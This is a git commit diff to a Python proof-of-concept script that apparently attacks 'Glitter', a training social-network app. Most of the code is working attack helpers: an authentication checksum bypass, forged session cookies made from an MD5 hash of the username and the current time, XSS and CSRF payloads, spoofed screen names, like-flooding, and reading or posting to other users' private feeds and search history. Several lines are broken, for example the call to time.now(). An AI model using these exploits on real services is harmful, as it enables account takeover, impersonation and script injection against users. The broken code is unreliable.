64aae7d586d1f9b265267d138961f0e3b9717471
eli7382 <eli.zaberchik@gmail.com>
2025-07-08 21:50:04 +0300

    Update glitter.py

--- glitter.py
+++ glitter.py
@@ -1,10 +1,20 @@
 import socket
 import time
 import requests
+import hashlib
 
 SERVER_PORT = 1336
 SERVER_IP = "44.224.228.136"
 URL = "http://glitter.org.il/"
+DEFAULT_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+    'Accept': 'application/json, text/plain, */*',
+    'Content-Type': 'application/json',
+    'Origin': URL,
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Connection': 'keep-alive',
+}
 
 # Global variables used across the module. These are populated during
 # the login process and reused by the various PoC helper functions so
@@ -12,10 +22,11 @@ URL = "http://glitter.org.il/"
 
 sock = None
 user_id = None
-username = None
-password = None
 current_time = None
 cookie = None
+username = None
+password = None
+target_user_id = None
 
 
 def send_and_receive_app(message):
@@ -38,21 +49,21 @@ def send_and_receive_app(message):
     return response
 
 
-def send_and_receive_website(method, path, params=None, data=None, headers=None, cookies=None):
+def send_and_receive_website(method, path, params=None, data=None, referer='home'):
     """
     a function to send a message to the server and receive a response, website only
     :return: the response from the server
     :rtype: str
     """
+    global cookie
     url = URL + path
-    default_headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-    }
-    if headers:
-        default_headers.update(headers)
-    resp = requests.request(method, url, params=params, data=data, headers=default_headers, cookies={"sparkle": cookie},)
+    headers = dict(DEFAULT_HEADERS)
+    headers['Referer'] = URL + referer
+    use_cookie = not (referer == "login" or path == "user/")
+    if use_cookie and cookie:
+        resp = requests.request(method=method, url=url, params=params, data=data, headers=headers, cookies=cookie)
+    else:
+        resp = requests.request(method=method, url=url, params=params, data=data, headers=headers)
     return resp
 
 
@@ -92,18 +103,9 @@ def login_with_checksum_bypass(login_username):
     :return: the conversation socket and the user id (if found)
     :rtype: tuple
     """
-    global username, password, user_id
-
-    username = login_username
     connect_to_server()
     dummy_password = "~*`'>``~"
-    login_msg = (
-        '100#{gli&&er}{"user_name":"'
-        + username
-        + '","password":"'
-        + dummy_password
-        + '","enable_push_notifications":true}##'
-    )
+    login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + dummy_password + '","enable_push_notifications":true}##')
     response = send_and_receive_app(login_msg)
     print("Response: " + response)
     if "ascii checksum:" in response:
@@ -111,7 +113,7 @@ def login_with_checksum_bypass(login_username):
         checksum_end = response.find("{", checksum_start)
         required_checksum = int(response[checksum_start:checksum_end])
         print("Server requires checksum: " + str(required_checksum))
-        current_sum = calculate_checksum(username, "")
+        current_sum = calculate_checksum(login_username, "")
         needed_for_password = required_checksum - current_sum
         if needed_for_password > 0:
             if needed_for_password < 127:
@@ -120,13 +122,7 @@ def login_with_checksum_bypass(login_username):
                 password = "a" * (needed_for_password // 97)
         else:
             password = "1"
-        login_msg = (
-            '100#{gli&&er}{"user_name":"'
-            + username
-            + '","password":"'
-            + password
-            + '","enable_push_notifications":true}##'
-        )
+        login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + password + '","enable_push_notifications":true}##')
         response = send_and_receive_app(login_msg)
         print("Login response: " + response)
         if "Please complete ascii checksum" in response:
@@ -152,13 +148,7 @@ def send_multiple_likes(glit_id, count):
     """
     global sock, user_id
     for i in range(count):
-        like_msg = (
-            '710#{gli&&er}{"glit_id":'
-            + glit_id
-            + ',"user_id":'
-            + user_id
-            + ',"user_screen_name":"kolin jon"}##'
-        )
+        like_msg = ('710#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"kolin jon"}##')
         response = send_and_receive_app(like_msg)
         print("Like " + str(i + 1) + " response: " + response)
         time.sleep(0.5)
@@ -174,15 +164,7 @@ def send_like_with_fake_name(glit_id, fake_name):
     :return: none
     """
     global sock, user_id
-    like_msg = (
-        '710#{gli&&er}{"glit_id":'
-        + glit_id
-        + ',"user_id":'
-        + user_id
-        + ',"user_screen_name":"'
-        + fake_name
-        + '"}##'
-    )
+    like_msg = ('710#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"' + fake_name + '"}##')
     response = send_and_receive_app(like_msg)
     print("Response: " + response)
 
@@ -196,17 +178,7 @@ def send_glit_with_different_profile_image(profile_image):
     """
     global user_id, current_time
     current_time = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
-    glit_msg = (
-        '550#{gli&&er}{"feed_owner_id":'
-        + user_id
-        + ',"publisher_id":'
-        + user_id
-        + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im'
-        + profile_image
-        + '","background_color":"White","date":"'
-        + current_time
-        + '","content":"message","font_color":"black","id":-1}##'
-    )
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im' + profile_image + '","background_color":"White","date":"' + current_time + '","content":"message","font_color":"black","id":-1}##')
     response = send_and_receive_app(glit_msg)
     print("Response: " + response)
 
@@ -218,36 +190,24 @@ def send_glit_from_past():
     """
     global user_id
     past_date = "2000-06-17T11:54:58.220Z"
-    glit_msg = (
-        '550#{gli&&er}{"feed_owner_id":'
-        + user_id
-        + ',"publisher_id":'
-        + user_id
-        + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im3","background_color":"OrangeRed","date":"'
-        + past_date
-        + '","content":"Message from the past!","font_color":"black","id":-1}##'
-    )
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im3","background_color":"OrangeRed","date":"' + past_date + '","content":"Message from the past!","font_color":"black","id":-1}##')
     response = send_and_receive_app(glit_msg)
     print("Response: " + response)
 
 
-def access_other_user_feed(target_user_id):
+def access_other_user_feed():
     """
     a function to access other user's feed using their user_id
     :param target_user_id: the user_id of the target
     :type target_user_id: str
     :return: none
     """
-    feed_msg = (
-        '500#{gli&&er}{"feed_owner_id":'
-        + target_user_id
-        + ',"end_date":"2026-06-26T12:00:00.000Z","glit_count":10000}##'
-    )
+    feed_msg = ('500#{gli&&er}{"feed_owner_id":' + target_user_id + ',"end_date":"2026-06-26T12:00:00.000Z","glit_count":10000}##')
     response = send_and_receive_app(feed_msg)
     print("Feed response: " + response)
 
 
-def send_to_private_account(target_user_id):
+def send_to_private_account():
     """
     a function to send a glit to a private account
     :param target_user_id: the user_id of the target
@@ -255,15 +215,7 @@ def send_to_private_account(target_user_id):
     :return: none
     """
     global user_id, current_time
-    glit_msg = (
-        '550#{gli&&er}{"feed_owner_id":'
-        + target_user_id
-        + ',"publisher_id":'
-        + user_id
-        + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Red","date":"'
-        + current_time
-        + '","content":"post from kolin jon on private feed!","font_color":"black","id":-1}##'
-    )
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + target_user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Red","date":"' + current_time + '","content":"post from kolin jon on private feed!","font_color":"black","id":-1}##')
     response = send_and_receive_app(glit_msg)
     print("Response: " + response)
 
@@ -276,17 +228,7 @@ def send_colored_font_glit(color):
     :return: none
     """
     global user_id
-    glit_msg = (
-        '550#{gli&&er}{"feed_owner_id":'
-        + user_id
-        + ',"publisher_id":'
-        + user_id
-        + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im1","background_color":"White","date":"'
-        + current_time
-        + '","content":"Colored text message!","font_color":"'
-        + color
-        + '","id":-1}##'
-    )
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im1","background_color":"White","date":"' + current_time + '","content":"Colored text message!","font_color":"' + color + '","id":-1}##')
     response = send_and_receive_app(glit_msg)
     print("Response: " + response)
 
@@ -297,20 +239,8 @@ def send_xss_image_glit():
     :return: none
     """
     global user_id
-    xss_payload = (
-        """<img onload=\"window.open('https://www.google.com/', '_blank');\" src=\"https://images.unsplash.com/photo-1481833761820-0509d3217039?auto=format&fit=crop&w=800&q=80\" alt=\"Eiffel Tower in Heart Frame\" />"""
-    )
-    glit_msg = (
-        '550#{gli&&er}{"feed_owner_id":'
-        + user_id
-        + ',"publisher_id":'
-        + user_id
-        + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"White","date":"'
-        + current_time
-        + '","content":"'
-        + xss_payload
-        + '","font_color":"black","id":-1}##'
-    )
+    xss_payload = """<img onload=\"window.open('https://www.google.com/', '_blank');\" src=\"https://images.unsplash.com/photo-1481833761820-0509d3217039?auto=format&fit=crop&w=800&q=80\" alt=\"Eiffel Tower in Heart Frame\" />"""
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"White","date":"' + current_time + '","content":"' + xss_payload + '","font_color":"black","id":-1}##')
     response = send_and_receive_app(glit_msg)
     print("Response: " + response)
 
@@ -322,17 +252,7 @@ def send_xss_link_glit():
     """
     global user_id
     xss_link = '<a href=\\"javascript:alert(\'XSS\')\\" onclick=\\"alert(\'Clicked!\')\\">Click me</a>'
-    glit_msg = (
-        '550#{gli&&er}{"feed_owner_id":'
-        + user_id
-        + ',"publisher_id":'
-        + user_id
-        + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Teal","date":"'
-        + current_time
-        + '","content":"'
-        + xss_link
-        + '","font_color":"black","id":-1}##'
-    )
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Teal","date":"' + current_time + '","content":"' + xss_link + '","font_color":"black","id":-1}##')
     response = send_and_receive_app(glit_msg)
     print("Response: " + response)
 
@@ -347,17 +267,7 @@ def send_comment_fake_name(glit_id, fake_name):
     :return: none
     """
     global user_id
-    comment_msg = (
-        '650#{gli&&er}{"glit_id":'
-        + glit_id
-        + ',"user_id":'
-        + user_id
-        + ',"user_screen_name":"'
-        + fake_name
-        + '","content":"Comment with fake name","date":"'
-        + current_time
-        + '"}##'
-    )
+    comment_msg = ('650#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"' + fake_name + '","content":"Comment with fake name","date":"' + current_time + '"}##')
     response = send_and_receive_app(comment_msg)
     print("Response: " + response)
 
@@ -373,13 +283,7 @@ def send_multiple_wows(glit_id, count):
     """
     global user_id
     for i in range(count):
-        wow_msg = (
-            '750#{gli&&er}{"glit_id":'
-            + str(glit_id)
-            + ',"user_id":'
-            + str(user_id)
-            + ',"user_screen_name":"kolin jon"}##'
-        )
+        wow_msg = ('750#{gli&&er}{"glit_id":' + str(glit_id) + ',"user_id":' + str(user_id) + ',"user_screen_name":"kolin jon"}##')
         response = send_and_receive_app(wow_msg)
         print("Wow " + str(i + 1) + " response: " + response)
         time.sleep(0.5)
@@ -387,23 +291,49 @@ def send_multiple_wows(glit_id, count):
 
 def xsrf_send_message_to_yourself_from_another_user(publisher_id):
     msg = """<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=""" + user_id + """&publisher_id=""" + publisher_id + """&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=""" + current_time + """&content=I_was_hacked&font_color=black">"""
+    send_and_receive_website("GET", "glit?id=-1&feed_owner_id=23695&publisher_id=23695&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=2025-07-08T16:50:31.133Z&content=" + msg + "&font_color=black")
 
 
-def get_password(username):
-    """Placeholder for password retrieval demo."""
+def login_website():
+    path = "user"
+    payload = '["' + username + '","' + password + '"]'
+    response = send_and_receive_website(method="POST", path=path, data=payload, referer="login")
+    if response.status_code == 200:
+        extract_sparkle_cookie(response.text)
+    return response
+
+
+def extract_sparkle_cookie(response_text):
+    global cookie
+    if '"sparkle":"' in response_text:
+        start = response_text.find('"sparkle":"') + len('"sparkle":"')
+        end = response_text.find('"', start)
+        cookie = response_text[start:end]
+
+
+def get_password():
     pass
 
 
-def load_another_user_search_history(target_user_id):
-    send_and_receive_app("")
+def post_video_to_another_user_feed():
+    global user_id
+    global current_time
+    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + target_user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Red","date":"' + current_time + '","content":"<video autoplay loop><source src="https://files.catbox.moe/ehhz83.mp4" type="video/mp4"></video><audio autoplay><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>","font_color":"black","id":-1}##')
+    response = send_and_receive_app(glit_msg)
+    print("Response: " + response)
 
 
-def generate_cookie(username):
-    now = datetime.now()
+def load_another_user_search_history():
+    path = "history/" + target_user_id
+    response = send_and_receive_website("GET", path, None, None, None)
+
+
+def generate_cookie():
+    now = time.now()
     date_str = now.strftime("%d%m%Y")
     hour = str(int(now.strftime("%H")))
     minute = now.strftime("%M")
     time_str = hour + minute
     username_hash = hashlib.md5(username.encode()).hexdigest()
-    cookie = date_str + "." + username_hash + "." + time_str + "." + date_str
-    return cookie
+    generated_cookie = date_str + "." + username_hash + "." + time_str + "." + date_str
+    return generated_cookie
